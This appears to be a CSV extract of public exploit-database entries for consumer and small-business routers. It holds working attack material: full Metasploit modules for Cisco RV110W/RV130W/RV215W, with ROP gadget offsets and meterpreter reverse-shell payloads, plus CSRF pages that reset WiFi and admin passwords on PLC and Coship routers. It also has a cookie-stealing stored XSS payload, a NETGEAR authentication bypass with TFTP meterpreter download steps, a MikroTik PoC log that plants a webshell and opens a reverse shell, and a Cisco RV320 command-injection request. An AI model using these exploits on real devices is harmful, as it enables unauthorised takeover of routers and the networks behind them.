'got_offset'          => 0x000a0530,
'gadget1'             => 0x0003e7dc, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
'Arch'                => ARCH_MIPSLE,
'DefaultOptions'  => {
'PAYLOAD'         => 'linux/mipsle/meterpreter_reverse_tcp',
'DisclosureDate'  => 'Feb 27 2019',
'DefaultTarget'   => 0,
'Notes' => {
'Stability'   => [ CRASH_SERVICE_DOWN, ],
end
def p(lib, offset)
[(lib + offset).to_s(16)].pack('H*').reverse
end
def prepare_shellcode(cmd)
case target
when targets[0], targets[1], targets[2], targets[3], targets[4], targets[6], targets[7], targets[8], targets[9], targets[10], targets[11]
shellcode = rand_text_alpha(target['offset']) +           # filler
rand_text_alpha(4) +                                    # $s0
rand_text_alpha(4) +                                    # $s1
rand_text_alpha(4) +                                    # $s2
rand_text_alpha(4) +                                    # $s3
p(target['libc_base_addr'], target['system_offset']) +  # $s4
rand_text_alpha(4) +                                    # $s5
rand_text_alpha(4) +                                    # $s6
rand_text_alpha(4) +                                    # $s7
rand_text_alpha(4) +                                    # $s8
p(target['libcrypto_base_addr'], target['gadget1']) +   # $ra
p(target['libc_base_addr'], target['got_offset']) +
rand_text_alpha(28) +
cmd
shellcode
when targets[5] # RV130/RV130W
shellcode = rand_text_alpha(target['offset']) +           # filler
p(target['libc_base_addr'], target['gadget1']) +
p(target['libc_base_addr'], target['system_offset']) +  # r2
rand_text_alpha(4) +                                    # r6
p(target['libc_base_addr'], target['gadget2']) +        # pc
cmd
shellcode
end
end
def send_request(buffer)
begin
send_request_cgi({
'uri'     => '/login.cgi',
'method'  => 'POST',
'vars_post' => {
""submit_button"": ""login"",
""submit_type"": """",
""gui_action"": """",
""wait_time"": 0,
""change_action"": """",
""enc"": 1,
""user"": rand_text_alpha_lower(5),
""pwd"": buffer,
""sel_lang"": ""EN""
rescue ::Rex::ConnectionError
fail_with(Failure::Unreachable, ""#{peer} - Failed to connect to the router"")
end
end
def check
fingerprints = {
""69d906ddd59eb6755a7b9c4f46ea11cdaa47c706"" => {
""version"" => ""Cisco RV110W 1.1.0.9"",
""status"" =>Exploit::CheckCode::Vulnerable
""8d3b677d870425198f7fae94d6cfe262551aa8bd"" => {
""version"" => ""Cisco RV110W 1.2.0.9"",
""status"" => Exploit::CheckCode::Vulnerable
""134ee643ec877641030211193a43cc5e93c96a06"" => {
""version"" => ""Cisco RV110W 1.2.0.10"",
""status"" => Exploit::CheckCode::Vulnerable
""e3b2ec9d099a3e3468f8437e5247723643ff830e"" => {
""version"" => ""Cisco RV110W 1.2.1.4, 1.2.1.7, 1.2.2.1 (not vulnerable), 1.2.2.4 (not vulnerable)"",
""status"" => Exploit::CheckCode::Unknown
""6b7b1e8097e8dda26db27a09b8176b9c32b349b3"" => {
""version"" => ""Cisco RV130/RV130W 1.0.0.21"",
""status"" => Exploit::CheckCode::Vulnerable
""9b1a87b752d11c5ba97dd80d6bae415532615266"" => {
""version"" => ""Cisco RV130/RV130W 1.0.1.3"",
""status"" => Exploit::CheckCode::Vulnerable
""9b6399842ef69cf94409b65c4c61017c862b9d09"" => {
""version"" => ""Cisco RV130/RV130W 1.0.2.7"",
""status"" => Exploit::CheckCode::Vulnerable
""8680ec6df4f8937acd3505a4dd36d40cb02c2bd6"" => {
""version"" => ""Cisco RV130/RV130W 1.0.3.14, 1.0.3.16"",
""status"" => Exploit::CheckCode::Vulnerable
""8c8e05de96810a02344d96588c09b21c491ede2d"" => {
""version"" => ""Cisco RV130/RV130W 1.0.3.22, 1.0.3.28, 1.0.3.44, 1.0.3.45 (not vulnerable), 1.0.3.51 (not vulnerable)"",
""status"" => Exploit::CheckCode::Unknown
""2f29a0dfa78063d643eb17388e27d3f804ff6765"" => {
""version"" => ""Cisco RV215W 1.1.0.5"",
""status"" => Exploit::CheckCode::Vulnerable
""e5cc84d7c9c2d840af85d5f25cee33baffe3ca6f"" => {
""version"" => ""Cisco RV215W 1.1.0.6"",
""status"" => Exploit::CheckCode::Vulnerable
""7cc8fcce5949a68c31641c38255e7f6ed31ff4db"" => {
""version"" => ""Cisco RV215W 1.2.0.14 or 1.2.0.15"",
""status"" => Exploit::CheckCode::Vulnerable
""050d47ea944eaeadaec08945741e8e380f796741"" => {
""version"" => ""Cisco RV215W 1.3.0.7 or 1.3.0.8, 1.3.1.1 (not vulnerable), 1.3.1.4 (not vulnerable)"",
""status"" => Exploit::CheckCode::Unknown
uri = target_uri.path
res = send_request_cgi({
'method' => 'GET',
'uri' => normalize_uri(uri, 'lang_pack/EN.js')
if res && res.code == 200
fingerprint = Digest::SHA1.hexdigest(""#{res.body.to_s}"")
if fingerprints.key?(fingerprint)
print_good(""Successfully identified device: #{fingerprints[fingerprint][""version""]}"")
return fingerprints[fingerprint][""status""]
else
print_status(""Couldn't reliably fingerprint the target."")
end
end
Exploit::CheckCode::Unknown
end
def exploit
print_status('Sending request')
execute_cmdstager
end
def execute_command(cmd, opts = {})
shellcode = prepare_shellcode(cmd.to_s)
send_request(shellcode)
end
def on_new_session(session)
print_status(""Reloading httpd service"")
reload_httpd_service = ""killall httpd && cd /www && httpd && httpd -S""
if session.type.to_s.eql? 'meterpreter'
session.core.use 'stdapi' unless session.ext.aliases.include? 'stdapi'
session.sys.process.execute '/bin/sh', ""-c \""#{reload_httpd_service}\""""
else
session.shell_command(reload_httpd_service)
end
ensure
super
end
end"
2019-07-15,WebApps,Hardware,Wadeek,Netgear WiFi Router JWNR2010v5 / R6080,Authentication Bypass,"# Exploit Title: NETGEAR WiFi Router R6080 - Security Questions Answers Disclosure
# Date: 13/07/2019
# Exploit Author: Wadeek
# Hardware Version: R6080-100PES
# Firmware Version: 1.0.0.34 / 1.0.0.40
# Vendor Homepage: https://www.netgear.com/support/product/R6080.aspx
# Firmware Link: http://www.downloads.netgear.com/files/GDC/R6080/(R6080-V1.0.0.34.zip or R6080-V1.0.0.40.zip)
# Exploit Title: NETGEAR WiFi Router JWNR2010v5 - Security Questions Answers Disclosure
# Date: 13/07/2019
# Exploit Author: Wadeek
# Hardware Version: JWNR2010v5
# Firmware Version: 1.1.0.54
# Vendor Homepage: https://www.netgear.com/support/product/JWNR2010v5.aspx
# Firmware Link: http://www.downloads.netgear.com/files/GDC/JNR1010V2/N300-V1.1.0.54_1.0.1.zip
# Shodan Dork: ""HTTP/1.1 401 Unauthorized"" ""Set-Cookie: sessionid="" ""NETGEAR JWNR2010v5""","== Files Containing Juicy Info ==
>> http://192.168.1.1/currentsetting.htm
Firmware=V1.0.0.34WW
Model=R6080
>> http://192.168.1.1:56688/rootDesc.xml (Server: Unspecified, UPnP/1.0, Unspecified)
<serialNumber>SSSSSSSNNNNNN</serialNumber>
== Security Questions Bypass > Answers Disclosure ==
>> http://192.168.1.1/401_recovery.htm (SSSSSSSNNNNNN value for input)
<POST REQUEST>
htpwd_recovery.cgi?id=XXXXXXXXXXXXXXX (one attempt because /tmp/SessionFile.*.htm)
(replace)
dev_serial=SSSSSSSNNNNNN&todo=verify_sn&this_file=401_recovery.htm&next_file=securityquestions.htm&SID=
(by)
dev_serial=SSSSSSSNNNNNN&todo=verify_sn&this_file=401_recovery.htm&next_file=PWD_password.htm&SID=
<POST RESPONSE>
<input type=""text"" maxLength=""64"" size=""30"" name=""answer1"" onFocus=""this.select();"" value=""AnSw3R-1"">
<input type=""text"" maxLength=""64"" size=""30"" name=""answer2"" onFocus=""this.select();"" value=""AnSw3R-2"">
(repeat recovery process for get admin password)
== Authenticated Telnet Command Execution ==
>> http://admin:Str0nG-!P4ssW0rD@192.168.1.1/setup.cgi?todo=debug
:~$ telnet 192.168.1.1
R6080 login: admin
Password: Str0nG-!P4ssW0rD
upload by TFTP # tftp -p -r [LOCAL-FILENAME] [IP] [PORT]
download by TFTP # tftp -g -r [REMOTE-FILENAME_ELF_32-bit_LSB_executable_MIPS || linux/mipsle/meterpreter/reverse_tcp] [IP] [PORT]
== Files Containing Juicy Info ==
>> http://192.168.1.1/currentsetting.htm
Firmware=V1.1.0.54
Model=JWNR2010v5
>> http://192.168.1.1/BRS_netgear_success.html (Serial Number)
setTimeout('top.location.href = ""http://www.netgear.com/success/JWNR2010v5.aspx?sn=SSSSSSSNNNNNN"";',2000);
== Security Questions Bypass > Answers Disclosure (only if ""Password Recovery"" is ""Enable"") ==
>> http://192.168.1.1/401_recovery.htm (SSSSSSSNNNNNN value for input)
<POST REQUEST>
htpwd_recovery.cgi?id=XXXXXXXXXXXXXXX (one attempt because /tmp/SessionFile.*.htm)
(replace)
dev_serial=SSSSSSSNNNNNN&todo=verify_sn&this_file=401_recovery.htm&next_file=securityquestions.htm&SID=
(by)
dev_serial=SSSSSSSNNNNNN&todo=verify_sn&this_file=401_recovery.htm&next_file=PWD_password.htm&SID=
<POST RESPONSE>
<input type=""text"" maxLength=""64"" size=""30"" name=""htpwd_answer1"" onFocus=""this.select();"" value=""AnSw3R-1"">
<input type=""text"" maxLength=""64"" size=""30"" name=""htpwd_answer2"" onFocus=""this.select();"" value=""AnSw3R-2"">
(repeat recovery process for get admin password)
== Authenticated Telnet Command Execution ==
>> http://admin:Str0nG-!P4ssW0rD@192.168.1.1/setup.cgi?todo=debug
:~$ telnet 192.168.1.1
JWNR2010v5 login: admin
Password: Str0nG-!P4ssW0rD
upload by TFTP # tftp -p -r [LOCAL-FILENAME] [IP] [PORT]
download by TFTP # tftp -g -r [REMOTE-FILENAME_ELF_32-bit_LSB_executable_MIPS || linux/mipsle/meterpreter/reverse_tcp] [IP] [PORT]"
2019-07-12,WebApps,Hardware,ABDO10,Tenda D301 v2 Modem Router,Persistent Cross-Site Scripting,"# Exploit Title: tenda D301 v2 modem router stored xss CVE-2019-13492
# Exploit Author: ABDO10
# Date : July, 11th 2019
# Product : Tenda D301 v2  Modem Router
# version : v2
# Vendor Homepage: https://www.tp-link.com/au/home-networking/dsl-modem-router/td-w8960n/
# Tested on: Linux
# CVE : 2019-13491
# Poc Instructions :","> 1 - Open modem router  on web browser default(192.168.1.1)
> 2 - Click on advanced -> Wireless -> Security
> 3 - fill this payload : <img src=""xy"" OnError=prompt(document.cookie)>  as password
> 4 - Click on ""click to display"""
2019-04-15,Remote,Hardware,Metasploit,Cisco RV130W Routers,Management Interface Remote Command Execution (Metasploit),"# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
# linux/armle/meterpreter/bind_tcp -> segfault
# linux/armle/meterpreter/reverse_tcp -> segfault
# linux/armle/meterpreter_reverse_http -> works
# linux/armle/meterpreter_reverse_https -> works
# linux/armle/meterpreter_reverse_tcp -> works
# linux/armle/shell/bind_tcp -> segfault
# linux/armle/shell/reverse_tcp -> segfault
# linux/armle/shell_bind_tcp -> segfault
# linux/armle/shell_reverse_tcp -> segfault
#All these gadgets are from /lib/libc.so.0
# Given there is no process continuation here, the httpd server will stop
# functioning properly and we need to take care of proper restart
# ourselves.","class MetasploitModule < Msf::Exploit::Remote
Rank = GoodRanking
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::CmdStager
def initialize(info = {})
super(update_info(info,
'Name'           => 'Cisco RV130W Routers Management Interface Remote Command Execution',
'Description'    => %q{
A vulnerability in the web-based management interface of the Cisco RV130W Wireless-N Multifunction VPN Router
could allow an unauthenticated, remote attacker to execute arbitrary code on an affected device.
The vulnerability is due to improper validation of user-supplied data in the web-based management interface.
An attacker could exploit this vulnerability by sending malicious HTTP requests to a targeted device.
A successful exploit could allow the attacker to execute arbitrary code on the underlying operating
system of the affected device as a high-privilege user.
RV130W Wireless-N Multifunction VPN Router versions prior to 1.0.3.45 are affected.
Note: successful exploitation may not result in a session, and as such,
on_new_session will never repair the HTTP server, leading to a denial-of-service condition.
'Author'         =>
'Yu Zhang', # Initial discovery
'Haoliang Lu', # Initial discovery
'T. Shiomitsu', # Initial discovery
'Quentin Kaiser <kaiserquentin@gmail.com>' # Vulnerability analysis & exploit dev
'License'         => MSF_LICENSE,
'Platform'        =>  %w[linux],
'Arch'            =>  [ARCH_ARMLE],
'SessionTypes'    =>  %w[meterpreter],
'CmdStagerFlavor' => %w{ wget },
'Privileged'      => true, # BusyBox
'References'      =>
['CVE', '2019-1663'],
['BID', '107185'],
['URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190227-rmi-cmd-ex'],
'DefaultOptions' => {
'WfsDelay' => 10,
'SSL' => true,
'RPORT' => 443,
'CMDSTAGER::FLAVOR' => 'wget',
'PAYLOAD' => 'linux/armle/meterpreter_reverse_tcp',
'Targets'        =>
[ 'Cisco RV130/RV130W < 1.0.3.45',
'offset'          => 446,
'libc_base_addr'  => 0x357fb000,
'system_offset'   => 0x0004d144,
'gadget1'         => 0x00020e79, # pop {r2, r6, pc};
'gadget2'         => 0x00041308, # mov r0, sp; blx r2;
'Arch'            => ARCH_ARMLE,
'DisclosureDate'  => 'Feb 27 2019',
'DefaultTarget'   => 0,
'Notes' => {
'Stability'   => [ CRASH_SERVICE_DOWN, ],
end
def p(offset)
[(target['libc_base_addr'] + offset).to_s(16)].pack('H*').reverse
end
def prepare_shellcode(cmd)
shellcode = rand_text_alpha(target['offset']) +       # filler
p(target['gadget1']) +
p(target['system_offset']) +                        # r2
rand_text_alpha(4) +                                # r6
p(target['gadget2']) +                              # pc
cmd
shellcode
end
def send_request(buffer)
begin
send_request_cgi({
'uri'     => '/login.cgi',
'method'  => 'POST',
'vars_post' => {
""submit_button"": ""login"",
""submit_type"": """",
""gui_action"": """",
""wait_time"": 0,
""change_action"": """",
""enc"": 1,
""user"": rand_text_alpha_lower(5),
""pwd"": buffer,
""sel_lang"": ""EN""
rescue ::Rex::ConnectionError
fail_with(Failure::Unreachable, ""#{peer} - Failed to connect to the router"")
end
end
def exploit
print_status('Sending request')
execute_cmdstager
end
def execute_command(cmd, opts = {})
shellcode = prepare_shellcode(cmd.to_s)
send_request(shellcode)
end
def on_new_session(session)
print_status(""Reloading httpd service"")
reload_httpd_service = ""killall httpd && cd /www && httpd && httpd -S""
if session.type.to_s.eql? 'meterpreter'
session.core.use 'stdapi' unless session.ext.aliases.include? 'stdapi'
session.sys.process.execute '/bin/sh', ""-c \""#{reload_httpd_service}\""""
else
session.shell_command(reload_httpd_service)
end
ensure
super
end
end"
2019-03-20,WebApps,Hardware,Kumar Saurav,PLC Wireless Router GPN2.4P21-C-CN,Cross-Site Request Forgery,"# Exploit Title: PLC Wireless Router GPN2.4P21-C-CN -Cross-Site Request Forgery (CSRF)
# Date: 14/01/2019
# Exploit Author: Kumar Saurav
# Reference: https://0dayfindings.home.blog/2019/01/15/plc-wireless-router-gpn2-4p21-c-cn-cross-site-request-forgery-csrf/
# Vendor: ChinaMobile
# Category: Hardware
# Version: GPN2.4P21-C-CN (Firmware: W2001EN-00)
# Tested on: Windows
# CVE : CVE-2019-6282
#Description: ChinaMobile PLC Wireless Router GPN2.4P21-C-CN devices with firmware
#Reproduction Steps:","W2001EN-00 have CSRF vulnerability via the cgi-bin/webproc?getpage=html/index.html
subpage=wlsecurity URI, allowing an Attacker to change the Wireless Security Password.
Note: This enables an attacker to perform an unwanted action on a wireless router for which the user/admin is currently authenticated.
Step 1: User login to PLC wireless router
Step 2: User visits the attacker's malicious web page (PLC_CSRF.html)
Step 3: PLC_CSRF.html exploits CSRF vulnerability and changes the wireless Security (WPA/WPA2) key to ""PSWDmatlo331#@!""
Step 4: (192.168.59.254 in my Case)
<html>
<body>
<form method=""POST"" action=""http://192.168.59.254:80/cgi-bin/webproc"">
<input type=""text"" name=""sessionid"" value=""2a39a09e"">
<input type=""text"" name=""language"" value=""en_us"">
<input type=""text"" name=""sys_UserName"" value=""admin"">
<input type=""text"" name=""var:menu"" value=""setup"">
<input type=""text"" name=""var:page"" value=""wireless"">
<input type=""text"" name=""var:subpage"" value=""wlsecurity"">
<input type=""text"" name=""var:errorpage"" value=""wlsecurity"">
<input type=""text"" name=""getpage"" value=""html/index.html"">
<input type=""text"" name=""errorpage"" value=""html/index.html"">
<input type=""text"" name=""var:arrayid"" value=""0"">
<input type=""text"" name=""obj-action"" value=""set"">
<input type=""text"" name="":InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.BeaconType"" value=""11i"">
<input type=""text"" name="":InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.IEEE11iEncryptionModes"" value=""AESEncryption"">
<input type=""text"" name="":InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.IEEE11iAuthenticationMode"" value=""PSKAuthentication"">
<input type=""text"" name="":InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.X_TWSZ-COM_WPAGroupRekey"" value=""100"">
<input type=""text"" name="":InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.PreSharedKey.1.KeyPassphrase"" value=""PSWDmatlo331#@!"">
<input type=""text"" name="":InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.X_TWSZ-COM_PSKExpression"" value=""KeyPassphrase"">
<input type=""submit"" value=""Send"">
</form>
</body>
</html>"
2019-03-20,WebApps,Hardware,Kumar Saurav,PLC Wireless Router GPN2.4P21-C-CN,Incorrect Access Control,"# Exploit Title: PLC Wireless Router GPN2.4P21-C-CN -Incorrect Access
# Date: 14/01/2019
# Exploit Author: Kumar Saurav
# Reference: https://0dayfindings.home.blog/2019/01/15/plc-wireless-router-gpn2-4p21-c-cn-incorrect-access-control/
# Vendor: ChinaMobile
# Category: Hardware
# Version: GPN2.4P21-C-CN (Firmware: W2001EN-00)
# Tested on: Windows
# CVE : CVE-2019-6279
#Description: ChinaMobile PLC Wireless Router GPN2.4P21-C-CN devices with","Control
firmware
W2001EN-00 have an Incorrect Access Control vulnerability via the
cgi-bin/webproc?getpage=html/index.html
subpage=wlsecurity URI, allowing an Attacker to change the Wireless
Security Password.
Reproduction Steps:
Step 1: Building a malicious html web page
Step 2: Attacker’s wants to change the wireless security (WPA/WPA2) key to
“PSWDmatlo331#@!” (in my case)
Step 3: (192.168.59.254 in my Case)
<html>
<body>
<form method=”POST” action=”http://192.168.59.254:80/cgi-bin/webproc “>
<input type=”text” name=”sessionid” value=”2a39a09e”>
<input type=”text” name=”language” value=”en_us”>
<input type=”text” name=”sys_UserName” value=”admin”>
<input type=”text” name=”var:menu” value=”setup”>
<input type=”text” name=”var:page” value=”wireless”>
<input type=”text” name=”var:subpage” value=”wlsecurity”>
<input type=”text” name=”var:errorpage” value=”wlsecurity”>
<input type=”text” name=”getpage” value=”html/index.html”>
<input type=”text” name=”errorpage” value=”html/index.html”>
<input type=”text” name=”var:arrayid” value=”0?>
<input type=”text” name=”obj-action” value=”set”>
<input type=”text”
name=”:InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.BeaconType ”
value=”11i”>
<input type=”text”
name=”:InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.IEEE11iEncryptionModes”
value=”AESEncryption”>
<input type=”text”
name=”:InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.IEEE11iAuthenticationMode”
value=”PSKAuthentication”>
<input type=”text”
name=”:InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.X_TWSZ-COM_WPAGroupRekey”
value=”100?>
<input type=”text”
name=”:InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.PreSharedKey.1.KeyPassphrase”
value=”PSWDmatlo331#@!”>
<input type=”text”
name=”:InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.X_TWSZ-COM_PSKExpression”
value=”KeyPassphrase”>
<input type=”submit” value=”Send”>
</form>
</body>
</html>
Step 4: save this as Incorrect_Access_Control.html
Step 5: Planting this malicious web page (Incorrect_Access_Control.html)
that are likely to be visited by the victim’s (by social engineering) or
any user connected in the Access Point (AP) will have to visit this page or
any attacker’s connected in the AP will trigger this exploit.
Step 6: After execution of above exploit, wireless security (WPA/WPA2) key
will change!!
Note: This vulnerability allowing an attacker to reproduce without login."
2019-02-21,Remote,Hardware,Jacob Baines,MikroTik RouterOS < 6.43.12 (stable) / < 6.42.12 (long-term),Firewall and NAT Bypass,"# CVE-2019-3924
## Compilation
## Sample Usage
https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/46444.zip","A remote, unauthenticated attacker can proxy traffic through RouterOS via probes sent to the agent binary. This PoC demonstrates how to exploit a LAN host from the WAN. A video demonstrating the attack can be found here:
* https://www.youtube.com/watch?v=CxyOtsNVgFg
A Tenable Research Advisory for the vulnerability can be found here:
* https://www.tenable.com/security/research/tra-2019-07
This code was tested on Ubuntu 18.04. There is a dependency on boost, gtest, and cmake. Simply install them like so:
```sh
sudo apt install libboost-dev cmake
To compile simply do the following:
```sh
cd routeros/poc/cve_2019_3924/
mkdir build
cd build
cmake ..
```sh
albinolobster@ubuntu:~/routeros/poc/cve_2019_3924/build$ ./nvr_rev_shell --proxy_ip 192.168.1.70 --proxy_port 8291 --target_ip 10.0.0.252 --target_port 80 --listening_ip 192.168.1.7 --listening_port 1270
[!] Running in exploitation mode
[+] Attempting to connect to a MikroTik router at 192.168.1.70:8291
[+] Connected!
[+] Looking for a NUUO NVR at 10.0.0.252:80
[+] Found a NUUO NVR!
[+] Uploading a webshell
[+] Executing a reverse shell to 192.168.1.7:1270
[+] Done!
albinolobster@ubuntu:~/routeros/poc/cve_2019_3924/build$
Proof of Concept:"
2019-02-11,WebApps,Hardware,Adithyan AK,Coship Wireless Router 4.0.0.x/5.0.0.x,WiFi Password Reset,"# Exploit Title: Coship Wireless Router – Wireless SSID Unauthenticated Password Reset
# Date: 07.02.2019
# Exploit Author: Adithyan AK
# Vendor Homepage: http://en.coship.com/
# Category: Hardware (WiFi Router)
# Affected Versions *: *Coship RT3052 - 4.0.0.48, Coship RT3050 - 4.0.0.40, Coship WM3300 - 5.0.0.54, Coship WM3300 - 5.0.0.55, Coship RT7620 - 10.0.0.49.
# Tested on: MacOS Mojave v.10.14
# CVE: CVE-2019-7564
#POC :
# Change the X.X.X.X in poc to Router Gateway address and save the below code as Exploit.html
# Open Exploit.html with your Browser
# Click on “Submit request”
# The password of the Wireless SSID will be changed to ""password""","<html>
<body>
<script>history.pushState('', '', '/')</script>
<form action=""http://X.X.X.X/regx/wireless/wl_security_2G.asp
<http://router-ip/regx/wireless/wl_security_2G.asp>"" method=""POST"">
<input type=""hidden"" name=""wl&#95;wep"" value=""disabled"" />
<input type=""hidden"" name=""wl&#95;auth&#95;mode"" value=""none"" />
<input type=""hidden"" name=""page"" value=""wl&#95;security&#95;2G&#46;asp"" />
<input type=""hidden"" name=""wl&#95;unit"" value=""0"" />
<input type=""hidden"" name=""action"" value=""Apply"" />
<input type=""hidden"" name=""wl&#95;auth"" value=""0"" />
<input type=""hidden"" name=""wl&#95;akm"" value=""psk&#32;psk2"" />
<input type=""hidden"" name=""wl&#95;crypto"" value=""tkip&#43;aes"" />
<input type=""hidden"" name=""wl&#95;wpa&#95;gtk&#95;rekey"" value=""0"" />
<input type=""hidden"" name=""wl&#95;wpa&#95;psk"" value=""password"" />
<input type=""submit"" value=""Submit request"" />
</form>
</body>
</html>"
2019-01-25,WebApps,Hardware,RedTeam Pentesting,Cisco RV320 Dual Gigabit WAN VPN Router 1.4.2.15,Command Injection,"https://www.redteam-pentesting.de/
https://www.redteam-pentesting.de/jobs/","RedTeam Pentesting discovered a command injection vulnerability in the
web-based certificate generator feature of the Cisco RV320 router.
Details
Product: Cisco RV320 Dual Gigabit WAN VPN Router, possibly others
Affected Versions: 1.4.2.15 and later
Fixed Versions: since 1.4.2.20
Vulnerability Type: Remote Code Execution
Security Risk: medium
Vendor URL: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-inject
Vendor Status: fixed version released
Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2018-004
Advisory Status: published
CVE: CVE-2019-1652
CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1652
Introduction
""Keep your employees, your business, and yourself productive and
effective. The Cisco RV320 Dual Gigabit WAN VPN Router is an ideal
choice for any small office or small business looking for performance,
security, and reliability in its network.""
(from the Cisco RV320 product page [1])
More Details
The router's web interface enables users to generate new X.509
certificates directly on the device. A user may enter typical
configuration parameters required for the certificate, such as
organisation, the common name and so on. In order to generate the
certificate, the device uses the command-line program openssl [2]. The
device's firmware uses the following format string to assemble the
openssl command:
openssl req -new  -nodes  -subj '/C=%s/ST=%s/L=%s/O=%s/OU=%s/CN=%s/emailAddress=%s' -keyout %s%s.key -sha256 -out %s%s.csr -days %s -newkey rsa:%s  > /dev/null 2>&1
Although the web interface filters certain special characters via
JavaScript, there is actually no input filtering, escaping or encoding
happening on the server. This allows attackers to inject arbitrary
commands.
Proof of Concept
Even though all components of the subject seem to be vulnerable to
command injection, the following example uses the common name to trigger
a ping command:
a'$(ping -c 4 192.168.1.2)'b
The following HTTP POST request invokes the certificate generator
function and triggers the command injection. It requires a valid session
cookie for the device's web interface.
curl -s -b ""$COOKIE"" \
--data ""page=self_generator.htm&totalRules=1&OpenVPNRules=30""\
""&submitStatus=1&log_ch=1&type=4&Country=A&state=A&locality=A""\
""&organization=A&organization_unit=A&email=ab%40example.com""\
""&KeySize=512&KeyLength=1024&valid_days=30&SelectSubject_c=1&""\
""SelectSubject_s=1"" \
--data-urlencode ""common_name=a'\$(ping -c 4 192.168.1.2)'b"" \
""http://192.168.1.1/certificate_handle2.htm?type=4""
Afterwards, the incoming ICMP echo requests can be observed on the
attacker's system at 192.168.1.2.
Workaround
Prevent untrusted users from using the router's web interface.
Fix
Install firmware version 1.4.2.20 (or later) on the router.
Security Risk
The vulnerability allows attackers with administrative access to the
router's web interface to execute arbitrary operating system commands on
the device. Because attackers require valid credentials to the web
interface, this vulnerability is only rated as a medium risk.
Timeline
2018-09-19 Vulnerability identified
2018-09-27 Customer approved disclosure to vendor
2018-09-28 Vendor notified
2018-10-05 Receipt of advisory acknowledged by vendor
2018-10-05 Notified vendor of disclosure date: 2019-01-09
2018-12-21 Postponing disclosure to 2019-01-23, as requested by vendor
2019-01-16 List of affected versions provided by vendor
2019-01-23 Advisory published
References
[1] https://www.cisco.com/c/en/us/products/routers/rv320-dual-gigabit-wan-vpn-router/index.html
[2] https://wiki.openssl.org/index.php/Command_Line_Utilities
RedTeam Pentesting GmbH
RedTeam Pentesting offers individual penetration tests performed by a
team of specialised IT-security experts. Hereby, security weaknesses in
company networks or products are uncovered and can be fixed immediately.
As there are only few experts in this field, RedTeam Pentesting wants to
share its knowledge and enhance the public knowledge with research in
security-related areas. The results are made available as public
security advisories.
More information about RedTeam Pentesting can be found at:
Working at RedTeam Pentesting
RedTeam Pentesting is looking for penetration testers to join our team
in Aachen, Germany. If you are interested please visit:"
2019-01-16,WebApps,Hardware,Adithyan AK,Coship Wireless Router 4.0.0.48 / 4.0.0.40 / 5.0.0.54 / 5.0.0.55 / 10.0.0.49,Unauthenticated Admin Password Reset,"# Exploit Title: Coship Wireless Router – Unauthenticated Admin Password Reset
# Date: 15.01.2019
# Exploit Author: Adithyan AK
# Vendor Homepage: http://en.coship.com/
# Category: Hardware (Wifi Router)
# Affected Versions : Coship RT3052 - 4.0.0.48, Coship RT3050 - 4.0.0.40, Coship WM3300 - 5.0.0.54, Coship WM3300 - 5.0.0.55, Coship RT7620 - 10.0.0.49.
# Tested on: MacOS Mojave v.10.14
# CVE: CVE-2019-6441
# Change the X.X.X.X in poc to Router Gateway address and save the below code as Exploit.html
# Open Exploit.html with your Browser
# Click on “Submit request”
# Password of the admin will now be changed as ""password123""
# PoC :","<html>
<!-- Change the X.X.X.X with the router's IP address -->
<body>
<script>history.pushState('', '', '/')</script>
<form action=""http://X.X.X.X/apply.cgi"" method=""POST"">
<input type=""hidden"" name=""page"" value=""regx/management/accounts.asp"" />
<input type=""hidden"" name=""http_username"" value=""admin"" />
<input type=""hidden"" name=""http_passwd"" value=""password123"" />
<input type=""hidden"" name=""usr_confirm_password"" value=""password123"" />
<input type=""hidden"" name=""action"" value=""Submit"" />
<input type=""submit"" value=""Submit request"" />
</form>
</body>
</html>"
2019-01-07,WebApps,CGI,Kumar Saurav,PLC Wireless Router GPN2.4P21-C-CN,Cross-Site Scripting,"# Exploit Title: PLC Wireless Router GPN2.4P21-C-CN -Reflected XSS
# Date: 21/12/2018
# Exploit Author: Kumar Saurav
# Reference: https://0dayfindings.home.blog/2018/12/26/plc-wireless-router-gpn2-4p21-c-cn-reflected-xss/
# Vendor: ChinaMobile
# Category: Hardware
# Version: GPN2.4P21-C-CN (Firmware: W2001EN-00)
# Tested on: Multiple
# CVE : CVE-2018-20326
#Description: PLC Wireless Router's are vulnerable to a Reflected Cross Site Scripting (XSS).With this attack, the threat actor can steal cookies, session id, username or other sensitive information redirect an innocent victim to a malicious website, thus compromising the user.","Reproduction Steps:
Step 1: Go to Wi-fi Router Gateway (192.168.59.254 in my case)
Step 2: Login as Username and Password
Step 3: After Login below url will be shown
(http://192.168.59.254/cgi-bin/webprocgetpage=html/index.html&errorpage=html/main.html&var:language=en_us&var:menu=setup&var:page=connected&var:subpage=-)
Step 4: Insert the payload ""<script>alert(""XSS-Saurav"")</script>"" at the end of the above mentinoed url and hit enter
(http://192.168.59.254/cgi-bin/webprocgetpage=html/index.html&errorpage=html/main.html&var:language=en_us&var:menu=setup&var:page=connected&var:subpage=-<script>alert(""XSS-Saurav"")</script>)
Step 5: On execution of the payload, it will be popped up  as ""XSS-Saurav"""
2018-12-14,WebApps,Hardware,Rebellion,Huawei Router HG532e,Command Execution,#!/bin/python,"Author : Rebellion
Github : @rebe11ion
Twitter : @rebellion
import urllib2,requests,os,sys
from requests.auth import HTTPDigestAuth
DEFAULT_HEADERS = {""User-Agent"": ""Mozilla"", }
DEFAULT_TIMEOUT = 5
def fetch_url(url):
